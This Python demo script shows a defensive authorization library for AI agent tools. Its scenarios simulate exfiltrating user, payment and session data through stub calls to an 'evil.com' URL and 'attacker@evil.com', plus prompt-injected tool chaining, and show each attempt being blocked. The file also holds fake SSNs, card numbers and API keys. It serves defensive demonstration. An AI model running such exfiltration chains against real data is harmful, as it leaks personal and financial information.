# Copyright (c) 2025 Artoo Corporation
# Licensed under the Business Source License 1.1 (see LICENSE).
# Change Date: 2029-09-08  •  Change License: LGPL-3.0-or-later

"""Defense-in-Depth Demo: Abstract Sequencing with Runtime Inspection.

This demo showcases D2's comprehensive authorization through three layers:
  1. RBAC - Role-based access control
  2. Abstract Sequence Enforcement - Tool group-based temporal authorization
  3. Input/Output Guardrails - Data validation and sanitization

KEY FEATURES:
- Tool Groups: Semantic classification (sensitive_data, external_io, etc.)
- Runtime Inspection: See call history and which rules are enforced
- Scalable Security: O(1) rules cover N×M tool combinations
- Defense-in-Depth: Multiple layers prevent bypass

Run with:
    python examples/defense_in_depth_demo.py
"""

from __future__ import annotations

import os
from pathlib import Path
from typing import Any, Dict, List
import asyncio

from d2 import configure_rbac, d2_guard, set_user, clear_user_context, get_user_context
from d2.exceptions import PermissionDeniedError


# Set policy file path
EXAMPLES_DIR = Path(__file__).resolve().parent
POLICY_PATH = EXAMPLES_DIR / "defense_in_depth_policy.json"
# os.environ["D2_POLICY_FILE"] = str(POLICY_PATH)


# =============================================================================
# Runtime Inspection Utilities
# =============================================================================

def print_call_history():
    """Print the current request's tool call history for debugging."""
    ctx = get_user_context()
    if ctx and ctx.call_history:
        history_str = " → ".join(ctx.call_history)
        print(f"  📋 Call History: {history_str}")
    else:
        print("  📋 Call History: (empty)")


def print_context_info():
    """Print current user context information."""
    ctx = get_user_context()
    if ctx:
        roles_str = ", ".join(ctx.roles) if ctx.roles else "none"
        print(f"  👤 User: {ctx.user_id} | Roles: {roles_str}")
        if ctx.call_history:
            history_str = " → ".join(ctx.call_history)
            print(f"  📋 History: {history_str}")
    else:
        print("  👤 No user context set")


# =============================================================================
# SENSITIVE DATA SOURCES - @sensitive_data group
# =============================================================================

@d2_guard("database.read_users")
async def read_users(limit: int = 10) -> Dict[str, Any]:
    """Read users from database."""
    print(f"  [DB] Reading users (limit={limit})...")
    return {
        "users": [
            {"id": 1, "name": "Alice", "email": "alice@example.com", "ssn": "123-45-6789", "salary": 120000},
            {"id": 2, "name": "Bob", "email": "bob@example.com", "ssn": "987-65-4321", "salary": 95000},
        ][:limit],
        "source": "database.read_users"
    }


@d2_guard("database.read_payments")
async def read_payments(user_id: int) -> Dict[str, Any]:
    """Read payment data."""
    print(f"  [DB] Reading payments for user_id={user_id}...")
    return {
        "payments": [
            {"id": 101, "user_id": user_id, "amount": 99.99, "card_number": "4532-1234-5678-9012"}
        ],
        "source": "database.read_payments"
    }


@d2_guard("database.read_sessions")
async def read_sessions(user_id: int) -> Dict[str, Any]:
    """Read session data."""
    print(f"  [DB] Reading sessions for user_id={user_id}...")
    return {
        "sessions": [
            {"id": "sess_abc", "user_id": user_id, "ip_address": "192.168.1.1", "session_token": "tok_xyz"}
        ],
        "source": "database.read_sessions"
    }


@d2_guard("database.read_orders")
async def read_orders(user_id: int) -> Dict[str, Any]:
    """Read order data."""
    print(f"  [DB] Reading orders for user_id={user_id}...")
    return {
        "orders": [
            {"id": "ord_001", "user_id": user_id, "total": 299.99, "items": ["laptop", "mouse"]}
        ],
        "source": "database.read_orders"
    }


@d2_guard("secrets.get_api_key")
async def get_api_key(service: str) -> Dict[str, str]:
    """Retrieve API key for a service."""
    print(f"  [SECRETS] Getting API key for {service}...")
    keys = {
        "stripe": "sk_live_abc123xyz789def456ghi",
        "openai": "sk-proj-1234567890abcdefghij",
        "aws": "AKIA1234567890ABCDEF"
    }
    return {
        "service": service,
        "api_key": keys.get(service, "sk_unknown"),
        "source": "secrets.get_api_key"
    }


# =============================================================================
# EXTERNAL I/O - @external_io group
# =============================================================================

@d2_guard("web.http_request")
async def http_request(url: str, data: dict) -> Dict[str, Any]:
    """Send HTTP request to external service."""
    print(f"  [WEB] Sending request to {url}...")
    print(f"  [WEB] Data size: {len(str(data))} bytes")
    return {"status": "sent", "url": url, "source": "web.http_request"}


@d2_guard("email.send")
async def send_email(to: str, subject: str, body: str) -> Dict[str, Any]:
    """Send email."""
    print(f"  [EMAIL] Sending to {to}: {subject}")
    return {"status": "sent", "to": to, "source": "email.send"}


@d2_guard("slack.post_message")
async def post_slack_message(channel: str, message: str) -> Dict[str, Any]:
    """Post message to Slack."""
    print(f"  [SLACK] Posting to #{channel}: {message[:50]}...")
    return {"status": "posted", "channel": channel, "source": "slack.post_message"}


# =============================================================================
# INTERNAL PROCESSING - @internal_processing group
# =============================================================================

@d2_guard("analytics.summarize")
async def summarize(data: dict) -> Dict[str, Any]:
    """Summarize data through analytics."""
    print("  [ANALYTICS] Summarizing data...")
    return {
        "summary": f"Processed {len(data)} items",
        "source_data": data.get("source", "unknown"),
        "source": "analytics.summarize"
    }


@d2_guard("analytics.aggregate")
async def aggregate(data: dict) -> Dict[str, Any]:
    """Aggregate data."""
    print("  [ANALYTICS] Aggregating data...")
    return {
        "aggregate": "sum/count/avg computed",
        "source_data": data.get("source", "unknown"),
        "source": "analytics.aggregate"
    }


@d2_guard("ml.predict")
async def ml_predict(data: dict) -> Dict[str, Any]:
    """Run ML prediction."""
    print("  [ML] Running prediction model...")
    return {
        "prediction": "class_A",
        "confidence": 0.95,
        "source_data": data.get("source", "unknown"),
        "source": "ml.predict"
    }


# =============================================================================
# FILESYSTEM - @filesystem group
# =============================================================================

@d2_guard("file.write")
async def write_file(path: str, data: dict) -> Dict[str, Any]:
    """Write data to filesystem."""
    print(f"  [FILE] Writing to {path}...")
    return {"status": "written", "path": path, "source": "file.write"}


@d2_guard("file.read")
async def read_file(path: str) -> Dict[str, Any]:
    """Read from filesystem."""
    print(f"  [FILE] Reading {path}...")
    return {"content": "file_content_here", "path": path, "source": "file.read"}


# =============================================================================
# REPORTING - @public_reporting group
# =============================================================================

@d2_guard("reporting.generate")
async def generate_report(data: dict, format: str = "json") -> Dict[str, Any]:
    """Generate report."""
    print(f"  [REPORTING] Generating {format} report...")
    return {
        "report_id": "RPT-001",
        "format": format,
        "source_data": data.get("source", "unknown"),
        "source": "reporting.generate"
    }


@d2_guard("dashboard.update")
async def update_dashboard(data: dict) -> Dict[str, Any]:
    """Update dashboard."""
    print("  [DASHBOARD] Updating dashboard...")
    return {"status": "updated", "source": "dashboard.update"}


# =============================================================================
# Demo Scenarios - Defense in Depth with Runtime Inspection
# =============================================================================

async def demo_abstraction_power():
    """Scenario 1: Show how tool groups scale security rules."""
    print("\n" + "=" * 70)
    print("SCENARIO 1: Power of Abstract Sequencing")
    print("=" * 70)
    print("\nConcept: Tool groups let you write O(1) rules that cover N×M combinations")
    print("\nWithout abstraction:")
    print("  - 5 sensitive tools × 3 external channels = 15 explicit rules")
    print("  - Add 1 new tool → must update 3 rules manually")
    print("\nWith abstraction (@sensitive_data → @external_io):")
    print("  - 1 conceptual rule covers all combinations automatically")
    print("  - Add 1 new tool to group → automatically covered")
    
    print("\n" + "-" * 70)
    print("Demo: Multiple sensitive sources, one external channel")
    print("-" * 70)
    
    set_user("analyst-1", roles=["analyst"])
    
    # Test 1: Users → Web
    print("\nTest 1: database.read_users → web.http_request")
    try:
        users = await read_users(limit=2)
        print("  ✓ Step 1 passed")
        print_call_history()
        await http_request("https://evil.com/exfil", users)
        print("  ✗ Should have been blocked!")
    except PermissionDeniedError as e:
        print(f"  ✓ BLOCKED: {e.reason}")
        print_call_history()
    
    clear_user_context()
    set_user("analyst-2", roles=["analyst"])
    
    # Test 2: Payments → Web
    print("\nTest 2: database.read_payments → web.http_request")
    try:
        payments = await read_payments(user_id=1)
        print("  ✓ Step 1 passed")
        print_call_history()
        await http_request("https://evil.com/exfil", payments)
        print("  ✗ Should have been blocked!")
    except PermissionDeniedError as e:
        print(f"  ✓ BLOCKED: {e.reason}")
        print_call_history()
    
    clear_user_context()
    set_user("analyst-3", roles=["analyst"])
    
    # Test 3: Sessions → Web
    print("\nTest 3: database.read_sessions → web.http_request")
    try:
        sessions = await read_sessions(user_id=1)
        print("  ✓ Step 1 passed")
        print_call_history()
        await http_request("https://evil.com/exfil", sessions)
        print("  ✗ Should have been blocked!")
    except PermissionDeniedError as e:
        print(f"  ✓ BLOCKED: {e.reason}")
        print_call_history()
    
    print("\n💡 Key Insight:")
    print("  All three were blocked by the same abstract rule:")
    print("  '@sensitive_data → @external_io = DENY'")
    print("  This is why tool groups scale better than explicit lists!")
    
    clear_user_context()


async def demo_multi_channel_protection():
    """Scenario 2: One sensitive source, multiple external channels."""
    print("\n" + "=" * 70)
    print("SCENARIO 2: Multi-Channel Exfiltration Prevention")
    print("=" * 70)
    print("\nAttackers have many exfiltration channels. Tool groups cover them all.")
    
    set_user("analyst-4", roles=["analyst"])
    
    # Get sensitive data
    print("\nStep 1: Retrieve sensitive user data")
    users = await read_users(limit=2)
    print("  ✓ Success")
    print_call_history()
    
    # Try multiple channels
    print("\nStep 2a: Try to exfiltrate via Web")
    try:
        await http_request("https://evil.com/data", users)
        print("  ✗ Not blocked!")
    except PermissionDeniedError as e:
        print(f"  ✓ BLOCKED: {e.reason}")
    
    print("\nStep 2b: Try to exfiltrate via Email")
    try:
        await send_email("attacker@evil.com", "Data", str(users))
        print("  ✗ Not blocked!")
    except PermissionDeniedError as e:
        print(f"  ✓ BLOCKED: {e.reason}")
    
    print("\nStep 2c: Try to exfiltrate via Slack")
    try:
        await post_slack_message("external-channel", str(users))
        print("  ✗ Not blocked!")
    except PermissionDeniedError as e:
        print(f"  ✓ BLOCKED: {e.reason}")
    
    print("\n💡 Key Insight:")
    print("  All three channels blocked by group membership in @external_io")
    print("  Add webhook.trigger? Automatically covered.")
    
    clear_user_context()


async def demo_transitive_with_inspection():
    """Scenario 3: Transitive attacks with full call history visibility."""
    print("\n" + "=" * 70)
    print("SCENARIO 3: Transitive Exfiltration with Runtime Inspection")
    print("=" * 70)
    print("\nData laundering: Sensitive → Processing → External")
    print("Runtime inspection shows exactly what's being blocked\n")
    
    set_user("analyst-5", roles=["analyst"])
    
    # 3-hop attack
    print("Attack: Users → Analytics → Web (3-hop)")
    print("-" * 70)
    
    try:
        print("\nStep 1: Read users")
        users = await read_users(limit=2)
        print("  ✓ Allowed")
        print_call_history()
        
        print("\nStep 2: Launder through analytics")
        summary = await summarize(users)
        print("  ✓ Allowed")
        print_call_history()
        
        print("\nStep 3: Attempt external transmission")
        await http_request("https://evil.com/report", summary)
        print("  ✗ Should have been blocked!")
        
    except PermissionDeniedError as e:
        print(f"  ✓ BLOCKED: {e.reason}")
        print_call_history()
        print("\n  The sequence enforcer detected the 3-hop pattern:")
        print("  database.read_users → analytics.summarize → web.http_request")
    
    clear_user_context()
    
    # Different 3-hop attack with ML
    print("\n" + "-" * 70)
    print("Attack: Payments → ML → Email (different tools, same pattern)")
    print("-" * 70)
    
    set_user("analyst-6", roles=["analyst"])
    
    try:
        print("\nStep 1: Read payments")
        payments = await read_payments(user_id=1)
        print("  ✓ Allowed")
        print_call_history()
        
        print("\nStep 2: Process through ML")
        prediction = await ml_predict(payments)
        print("  ✓ Allowed")
        print_call_history()
        
        print("\nStep 3: Attempt email transmission")
        await send_email("attacker@evil.com", "ML Results", str(prediction))
        print("  ✗ Should have been blocked!")
        
    except PermissionDeniedError as e:
        print(f"  ✓ BLOCKED: {e.reason}")
        print_call_history()
        print("\n  Different tools, but same abstract pattern blocked")
    
    clear_user_context()
    
    print("\n💡 Key Insight:")
    print("  Runtime inspection shows the EXACT call chain")
    print("  Developers/security can audit and tune rules based on actual flows")


async def demo_role_specific_rules():
    """Scenario 4: Different roles have different sequence restrictions."""
    print("\n" + "=" * 70)
    print("SCENARIO 4: Role-Specific Sequence Rules")
    print("=" * 70)
    print("\nDifferent roles need different restrictions based on their job function\n")
    
    # Analyst: Can't exfiltrate
    print("Role 1: Analyst - Can access data but can't exfiltrate")
    print("-" * 70)
    set_user("analyst-7", roles=["analyst"])
    
    try:
        users = await read_users(limit=2)
        print("  ✓ Can read users")
        await http_request("https://api.example.com/sync", users)
        print("  ✗ Should be blocked!")
    except PermissionDeniedError as e:
        print(f"  ✓ Exfiltration blocked: {e.reason}")
    
    clear_user_context()
    
    # Data Engineer: Can't write sensitive data to filesystem
    print("\nRole 2: Data Engineer - Can't persist sensitive data locally")
    print("-" * 70)
    set_user("de-1", roles=["data_engineer"])
    
    try:
        users = await read_users(limit=2)
        print("  ✓ Can read users")
        await write_file("/tmp/users.json", users)
        print("  ✗ Should be blocked!")
    except PermissionDeniedError as e:
        print(f"  ✓ File write blocked: {e.reason}")
    
    clear_user_context()
    
    # Integration Service: Can call external APIs but can't read then send files
    print("\nRole 3: Integration Service - Can't exfiltrate files")
    print("-" * 70)
    set_user("integration-1", roles=["integration_service"])
    
    try:
        config = await read_file("/etc/app/config.json")
        print("  ✓ Can read files")
        await http_request("https://api.example.com/upload", config)
        print("  ✗ Should be blocked!")
    except PermissionDeniedError as e:
        print(f"  ✓ File exfiltration blocked: {e.reason}")
    
    clear_user_context()
    
    print("\n💡 Key Insight:")
    print("  Each role has sequence rules tailored to their threat model")
    print("  Same tool, different context = different security policy")


async def demo_business_logic_rules():
    """Scenario 5: Business-specific rules beyond just sensitivity."""
    print("\n" + "=" * 70)
    print("SCENARIO 5: Business Logic Rules (Not Just Sensitivity)")
    print("=" * 70)
    print("\nSome sequence rules are about business logic, not just data sensitivity\n")
    
    set_user("analyst-8", roles=["analyst"])
    
    # Payment data shouldn't go through general analytics
    print("Business Rule 1: Payment data requires specialized analytics")
    print("-" * 70)
    try:
        payments = await read_payments(user_id=1)
        print("  ✓ Can read payments")
        print_call_history()
        
        await summarize(payments)
        print("  ✗ Should be blocked!")
    except PermissionDeniedError as e:
        print(f"  ✓ BLOCKED: {e.reason}")
        print("  This isn't about exfiltration - it's about business rules")
        print("  Payment data must use payment-specific analytics for compliance")
    
    clear_user_context()
    set_user("analyst-9", roles=["analyst"])
    
    # Order data can't be used for ML training
    print("\nBusiness Rule 2: Order data can't feed ML models")
    print("-" * 70)
    try:
        orders = await read_orders(user_id=1)
        print("  ✓ Can read orders")
        print_call_history()
        
        await ml_predict(orders)
        print("  ✗ Should be blocked!")
    except PermissionDeniedError as e:
        print(f"  ✓ BLOCKED: {e.reason}")
        print("  Privacy policy: No order data in ML training datasets")
    
    clear_user_context()
    
    print("\n💡 Key Insight:")
    print("  Sequence enforcement isn't just about security")
    print("  It's also about business logic, compliance, and data governance")


async def demo_safe_workflows():
    """Scenario 6: Legitimate workflows that should pass all checks."""
    print("\n" + "=" * 70)
    print("SCENARIO 6: Safe Workflows (Defense Doesn't Break Functionality)")
    print("=" * 70)
    print("\nLegitimate internal workflows must remain functional\n")
    
    set_user("analyst-10", roles=["analyst"])
    
    # Safe workflow 1: Internal analytics → reporting
    print("Safe Workflow 1: Internal Analytics → Dashboard")
    print("-" * 70)
    try:
        # Create non-sensitive summary
        summary_data = {"metric": "page_views", "count": 1000}
        summary = await summarize(summary_data)
        print("  ✓ Analytics completed")
        print_call_history()
        
        # Update dashboard
        result = await update_dashboard(summary)
        print("  ✓ Dashboard updated")
        print_call_history()
        
        print("\n  Entire workflow succeeded - no sensitive data involved")
        
    except PermissionDeniedError as e:
        print(f"  ✗ Unexpected block: {e.reason}")
    
    clear_user_context()
    
    # Safe workflow 2: Aggregate → Report
    print("\nSafe Workflow 2: Analytics → Report Generation")
    print("-" * 70)
    set_user("analyst-11", roles=["analyst"])
    
    try:
        # Aggregate metrics
        metrics = {"type": "aggregated_metrics", "values": [1, 2, 3]}
        agg = await aggregate(metrics)
        print("  ✓ Aggregation completed")
        print_call_history()
        
        # Generate report
        report = await generate_report(agg, format="json")
        print("  ✓ Report generated")
        print_call_history()
        
        print("\n  Safe internal processing chain allowed")
        
    except PermissionDeniedError as e:
        print(f"  ✗ Unexpected block: {e.reason}")
    
    clear_user_context()
    
    print("\n💡 Key Insight:")
    print("  Defense-in-depth doesn't block legitimate operations")
    print("  Only dangerous patterns (sensitive → external) are denied")


async def demo_full_context_inspection():
    """Scenario 7: Full runtime inspection for debugging/auditing."""
    print("\n" + "=" * 70)
    print("SCENARIO 7: Runtime Inspection for Debugging/Auditing")
    print("=" * 70)
    print("\nDevelopers and security teams can see exactly what's happening\n")
    
    set_user("analyst-12", roles=["analyst"])
    print_context_info()
    
    print("\nBuilding a complex call chain...")
    print("-" * 70)
    
    # Step 1
    print("\n[1] Read users")
    users = await read_users(limit=1)
    print("  ✓ Success")
    print_call_history()
    
    # Step 2
    print("\n[2] Aggregate data")
    agg = await aggregate(users)
    print("  ✓ Success")
    print_call_history()
    
    # Step 3
    print("\n[3] Generate report")
    report = await generate_report(agg)
    print("  ✓ Success")
    print_call_history()
    
    # Step 4 (will fail)
    print("\n[4] Attempt to send externally")
    try:
        await http_request("https://api.example.com/reports", report)
        print("  ✗ Not blocked!")
    except PermissionDeniedError as e:
        print(f"  ✓ BLOCKED: {e.reason}")
        print_call_history()
        print("\n  Full chain visible:")
        print("  database.read_users → analytics.aggregate → reporting.generate → web.http_request")
        print("  Even though intermediate steps were allowed, the full chain revealed the attack")
    
    clear_user_context()
    
    print("\n💡 Key Insight:")
    print("  Call history provides full audit trail")
    print("  Security teams can analyze patterns and tune policies")
    print("  Developers can debug why a call was blocked")


# =============================================================================
# CONDITIONAL AUTHORIZATION SCENARIOS (NEW Execution Order Demonstration)
# =============================================================================

async def demo_conditional_scenario_a():
    """Scenario A: Input Validation Saves the Day.
    
    Sequence: database.read_users → web.http_request (normally blocked)
    Input to web: SAFE (no PII patterns)
    Execution Order: RBAC ✓ → Input Validation ✓ → Sequence (would block) → BUT inputs are safe
    Result: ALLOW (inputs validated as safe despite dangerous sequence)
    """
    print("\n" + "=" * 70)
    print("SCENARIO A: Input Validation Enables Conditional Sequence")
    print("=" * 70)
    print("\n📋 Test: database → web with SAFE inputs (no PII)")
    print("Expected: ALLOW (input validation makes sequence safe)")
    
    set_user("analyst-001", roles=["analyst"])
    print_context_info()
    
    try:
        # Step 1: Read from database (contains PII but will be sanitized)
        users = await read_users(limit=5)
        print(f"  [1] ✓ database.read_users successful")
        print(f"      Output sanitized: {users}")
        print_call_history()
        
        # Step 2: Send to web with SAFE data (no PII in request)
        # This should PASS input validation because data has no PII patterns
        web_data = "summary: " + str(len(users.get("users", []))) + " users"
        result = await http_request(
            url="https://api.example.com/report",
            data=web_data
        )
        print(f"  [2] ✓ web.http_request ALLOWED despite sequence!")
        print(f"      Why? Input validation passed (no PII in data)")
        print(f"      Result: {result}")
        print_call_history()
        
        print("\n🎯 KEY INSIGHT:")
        print("  • Dangerous sequence (database → web) was attempted")
        print("  • BUT input validation checked BEFORE sequence enforcement")
        print("  • Safe inputs = sequence becomes acceptable")
        print("  • This is conditional authorization in action!")
        
    except PermissionDeniedError as e:
        print(f"  [!] UNEXPECTED: Should have been allowed: {e}")
    finally:
        clear_user_context()


async def demo_conditional_scenario_b():
    """Scenario B: Bad Sequence + Bad Input = Denied at Input Layer.
    
    Sequence: database.read_users → web.http_request (blocked)
    Input to web: Contains PII (fails validation)
    Execution Order: RBAC ✓ → Input Validation ✗ (DENIED HERE, sequence never checked)
    Result: DENY at input validation (efficient fail-fast)
    """
    print("\n" + "=" * 70)
    print("SCENARIO B: Bad Sequence + Bad Input = Input Validation Denial")
    print("=" * 70)
    print("\n📋 Test: database → web with PII in input")
    print("Expected: DENY at input validation layer (before sequence check)")
    
    set_user("analyst-002", roles=["analyst"])
    print_context_info()
    
    try:
        # Step 1: Read from database
        users = await read_users(limit=2)
        print(f"  [1] ✓ database.read_users successful")
        print_call_history()
        
        # Step 2: Try to send PII to web (should fail input validation)
        pii_data = "user_ssn: 123-45-6789, email: test@example.com"
        result = await http_request(
            url="https://api.example.com/exfiltrate",
            data=pii_data
        )
        print(f"  [!] UNEXPECTED: Should have been denied! {result}")
        
    except PermissionDeniedError as e:
        print(f"  [2] ✗ web.http_request DENIED at Input Validation")
        print(f"      Reason: {e.reason}")
        print(f"      Why? Input contained PII patterns (SSN, email)")
        print_call_history()
        
        print("\n🎯 KEY INSIGHT:")
        print("  • Input validation happens BEFORE sequence check")
        print("  • Efficient: Failed early, sequence never evaluated")
        print("  • Layer 2 (Input) blocked before Layer 3 (Sequence)")
    finally:
        clear_user_context()


async def demo_conditional_scenario_c():
    """Scenario C: Good Sequence, Bad Input = Still Denied.
    
    Sequence: web.http_request → database.read_users (safe order)
    Input to database: SQL injection attempt
    Execution Order: RBAC ✓ → Input Validation ✗ (DENIED)
    Result: DENY (even safe sequences require safe inputs)
    """
    print("\n" + "=" * 70)
    print("SCENARIO C: Safe Sequence + Bad Input = Input Validation Denial")
    print("=" * 70)
    print("\n📋 Test: web → database (safe order) but with invalid input")
    print("Expected: DENY at input validation (bad inputs block even safe sequences)")
    
    set_user("analyst-003", roles=["analyst"])
    print_context_info()
    
    try:
        # Step 1: Web request (establishes safe sequence pattern)
        await http_request(
            url="https://api.example.com/data",
            data="query_request"
        )
        print(f"  [1] ✓ web.http_request successful")
        print_call_history()
        
        # Step 2: Database with invalid input (limit out of range)
        users = await read_users(limit=999)  # Violates max: 100 constraint
        print(f"  [!] UNEXPECTED: Should have been denied! {users}")
        
    except PermissionDeniedError as e:
        print(f"  [2] ✗ database.read_users DENIED at Input Validation")
        print(f"      Reason: {e.reason}")
        print(f"      Why? limit=999 exceeds max: 100 constraint")
        print_call_history()
        
        print("\n🎯 KEY INSIGHT:")
        print("  • Sequence was SAFE (web → database is allowed)")
        print("  • But input validation still enforces constraints")
        print("  • All layers are independent: safe sequence ≠ bypass inputs")
    finally:
        clear_user_context()


async def demo_conditional_scenario_d():
    """Scenario D: Bad Sequence + Safe Inputs + Unsafe Output = Output Denial.
    
    Sequence: database → analytics → web (3-hop, might be blocked)
    Inputs: All safe (pass validation)
    Output: database returns unredacted PII (if not sanitized)
    Execution Order: RBAC ✓ → Input ✓ → Sequence (depends) → Execute ✓ → Output (checks sanitization)
    Result: Shows output layer protection
    """
    print("\n" + "=" * 70)
    print("SCENARIO D: Multi-Layer Check - Output Sanitization Verification")
    print("=" * 70)
    print("\n📋 Test: database → analytics → web (outputs sanitized?)")
    print("Expected: If outputs properly sanitized, sequence becomes safe")
    
    set_user("analyst-004", roles=["analyst"])
    print_context_info()
    
    try:
        # Step 1: Read users (output should be sanitized per policy)
        users = await read_users(limit=10)
        print(f"  [1] ✓ database.read_users successful")
        print(f"      Note: SSN/salary filtered by output sanitization")
        print(f"      Safe output: {users}")
        print_call_history()
        
        # Step 2: Process with analytics (safe intermediate step)
        summary = await summarize(data=users)
        print(f"  [2] ✓ analytics.summarize successful")
        print(f"      Aggregated: {summary}")
        print_call_history()
        
        # Step 3: Send to web (should work because data was sanitized)
        result = await http_request(
            url="https://api.example.com/analytics",
            data=str(summary)
        )
        print(f"  [3] ✓ web.http_request successful")
        print(f"      Why? Output sanitization removed PII in step 1")
        print(f"      Result: {result}")
        print_call_history()
        
        print("\n🎯 KEY INSIGHT:")
        print("  • 3-hop sequence: database → analytics → web")
        print("  • Output sanitization (Layer 5) stripped PII")
        print("  • Clean data makes dangerous sequences safe")
        print("  • This is defense-in-depth working perfectly!")
        
    except PermissionDeniedError as e:
        print(f"  ✗ Denied: {e.reason}")
        print(f"  Note: Check if sequence rule or output validation blocked")
    finally:
        clear_user_context()


async def demo_conditional_scenario_e():
    """Scenario E: Bad Sequence + Fully Guarded = Allowed.
    
    Sequence: database → web (normally blocked)
    Input validation: ✓ (safe params)
    Output sanitization: ✓ (PII filtered)
    Execution Order: All layers pass despite dangerous sequence
    Result: ALLOW (defense-in-depth makes it safe)
    """
    print("\n" + "=" * 70)
    print("SCENARIO E: Full Defense-in-Depth - Dangerous Sequence Made Safe")
    print("=" * 70)
    print("\n📋 Test: database → web with FULL guardrails")
    print("Expected: ALLOW (all guardrails make dangerous sequence safe)")
    
    set_user("analyst-005", roles=["analyst"])
    print_context_info()
    
    try:
        # Step 1: Read users with output sanitization active
        users = await read_users(limit=5)
        print(f"  [1] ✓ database.read_users")
        print(f"      Output sanitized: {users}")
        print(f"      SSN/salary removed by policy")
        print_call_history()
        
        # Step 2: Send ONLY sanitized summary to web (no PII)
        safe_summary = f"User count: {len(users.get('users', []))}"
        result = await http_request(
            url="https://api.example.com/metrics",
            data=safe_summary
        )
        print(f"  [2] ✓ web.http_request ALLOWED")
        print(f"      Input validation: ✓ (no PII patterns)")
        print(f"      Output was sanitized: ✓ (step 1)")
        print(f"      Sequence: dangerous but SAFE due to guardrails")
        print(f"      Result: {result}")
        print_call_history()
        
        print("\n🎯 COMPREHENSIVE PROTECTION:")
        print("  ┌─────────────────────────────────────────────┐")
        print("  │ Layer 1: RBAC              ✓ (analyst role) │")
        print("  │ Layer 2: Input Validation  ✓ (no PII)       │")
        print("  │ Layer 3: Sequence          ⚠ (dangerous)    │")
        print("  │ Layer 4: Execute           ✓ (ran safely)   │")
        print("  │ Layer 5: Output Sanitize   ✓ (PII filtered) │")
        print("  └─────────────────────────────────────────────┘")
        print("\n  Result: BAD SEQUENCE + GOOD GUARDRAILS = SAFE")
        print("  This is the philosophy of conditional authorization!")
        
    except PermissionDeniedError as e:
        print(f"  ✗ Denied: {e.reason}")
    finally:
        clear_user_context()


# =============================================================================
# Main
# =============================================================================

async def main():
    """Run all defense-in-depth scenarios with runtime inspection."""
    
    print("\n" + "=" * 70)
    print("D2 DEFENSE-IN-DEPTH DEMO")
    print("Conditional Authorization + Execution Order")
    print("=" * 70)
    print(f"\nPolicy: {POLICY_PATH}")
    print("\nFeatures:")
    print("  • NEW: Conditional Authorization (bad sequence + good guardrails = safe)")
    print("  • NEW: Execution Order (RBAC → Input → Sequence → Execute → Output)")
    print("  • Tool Groups: Semantic classification of functions")
    print("  • Abstract Rules: O(1) rules cover N×M combinations")
    print("  • Runtime Inspection: See exactly what's happening")
    print("  • Defense-in-Depth: Multiple layers working together")
    
    # Initialize D2
    await configure_rbac()
    
    # =========================================================================
    # PART 1: CONDITIONAL AUTHORIZATION (NEW EXECUTION ORDER)
    # =========================================================================
    print("\n" + "━" * 70)
    print("PART 1: CONDITIONAL AUTHORIZATION SCENARIOS")
    print("━" * 70)
    print("\nDemonstrates the new execution order and how it enables")
    print("conditional sequences based on guardrails.\n")
    
    await demo_conditional_scenario_a()
    input("\nPress Enter to continue...\n")
    
    await demo_conditional_scenario_b()
    input("\nPress Enter to continue...\n")
    
    await demo_conditional_scenario_c()
    input("\nPress Enter to continue...\n")
    
    await demo_conditional_scenario_d()
    input("\nPress Enter to continue...\n")
    
    await demo_conditional_scenario_e()
    input("\nPress Enter to continue...\n")
    
    # =========================================================================
    # PART 2: ABSTRACT SEQUENCING & TOOL GROUPS (EXISTING DEMOS)
    # =========================================================================
    print("\n" + "━" * 70)
    print("PART 2: ABSTRACT SEQUENCING WITH TOOL GROUPS")
    print("━" * 70)
    print("\nDemonstrates scalable security with tool group abstractions.\n")
    
    await demo_abstraction_power()
    input("\nPress Enter to continue...\n")
    
    await demo_multi_channel_protection()
    input("\nPress Enter to continue...\n")
    
    await demo_transitive_with_inspection()
    input("\nPress Enter to continue...\n")
    
    await demo_role_specific_rules()
    input("\nPress Enter to continue...\n")
    
    await demo_business_logic_rules()
    input("\nPress Enter to continue...\n")
    
    await demo_safe_workflows()
    input("\nPress Enter to continue...\n")
    
    await demo_full_context_inspection()
    
    # Summary
    print("\n" + "=" * 70)
    print("DEMO COMPLETE - DEFENSE-IN-DEPTH WITH ABSTRACTION")
    print("=" * 70)
    print("\n🎯 TOOL GROUPS ABSTRACTION:")
    print("  • @sensitive_data: DB reads, secrets, PII")
    print("  • @external_io: Web, email, Slack, webhooks")
    print("  • @internal_processing: Analytics, ML, NLP")
    print("  • @filesystem: Local file operations")
    print("  • @public_reporting: Dashboards, reports")
    
    print("\n📊 SCALABILITY:")
    print("  Without groups: N sensitive tools × M channels = N×M rules")
    print("  With groups: 1 abstract rule covers all combinations")
    print("  Add new tool to group → automatically protected")
    
    print("\n🔍 RUNTIME INSPECTION:")
    print("  • See full call history for each request")
    print("  • Understand why a call was blocked")
    print("  • Audit and analyze actual usage patterns")
    print("  • Tune policies based on real-world data")
    
    print("\n🛡️ DEFENSE-IN-DEPTH LAYERS (NEW EXECUTION ORDER):")
    print("  ┌────────────────────────────────────────────────────────────┐")
    print("  │ Layer 1: RBAC Check          → Who can access what?       │")
    print("  │            ↓                                                │")
    print("  │ Layer 2: Input Validation    → Are parameters safe?        │")
    print("  │            ↓                                                │")
    print("  │ Layer 3: Sequence Check      → Is this pattern dangerous?  │")
    print("  │            ↓                                                │")
    print("  │ Layer 4: Execute Function    → Run the tool                │")
    print("  │            ↓                                                │")
    print("  │ Layer 5: Output Validation   → Is the result safe?         │")
    print("  └────────────────────────────────────────────────────────────┘")
    print("\n  KEY INSIGHT: Input validation happens BEFORE sequence check!")
    print("  • Efficient: Fail fast on bad inputs")
    print("  • Conditional: Safe inputs can make dangerous sequences acceptable")
    print("  • Defense-in-Depth: Multiple independent layers")
    
    print("\n💡 WHY THIS MATTERS FOR AGENTIC AI:")
    print("  • Agents make complex multi-step decisions")
    print("  • Attackers can prompt-inject to chain tools")
    print("  • One tool alone might be safe, but chains can be dangerous")
    print("  • Abstract sequencing scales to 100s of agent tools")
    print("  • Runtime inspection enables continuous security improvement")
    
    print("\n🔐 PREVENTS:")
    print("  ✓ Direct exfiltration (DB → Web)")
    print("  ✓ Transitive attacks (DB → Analytics → Web)")
    print("  ✓ Multi-channel exploitation (Web/Email/Slack/etc)")
    print("  ✓ Local exfiltration (Sensitive → Filesystem)")
    print("  ✓ Business logic violations (Payment data misuse)")
    
    print("\n📈 PRODUCTION READY:")
    print("  • Fast: contextvars-based, no global state")
    print("  • Isolated: Each request has independent history")
    print("  • Scalable: O(1) rules, not O(N×M)")
    print("  • Observable: Full audit trails for compliance")
    print("  • Flexible: Role-specific and business-specific rules")
